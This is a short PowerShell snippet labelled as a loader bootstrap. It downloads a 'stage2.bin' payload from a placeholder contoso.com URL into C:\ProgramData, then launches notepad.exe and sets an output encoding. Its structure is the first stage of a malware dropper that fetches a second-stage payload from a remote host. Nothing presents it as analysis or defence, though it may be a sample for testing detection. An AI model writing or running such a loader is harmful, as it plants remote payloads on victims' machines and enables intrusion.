
<# Loader bootstrap #> $PayloadUrl = 'http://contoso.com:80/stage2.bin'; $Stage2Path = 'C:\ProgramData\payload.bin'; (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $Stage2Path); Start-Process -FilePath "notepad.exe" -ErrorAction SilentlyContinue; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
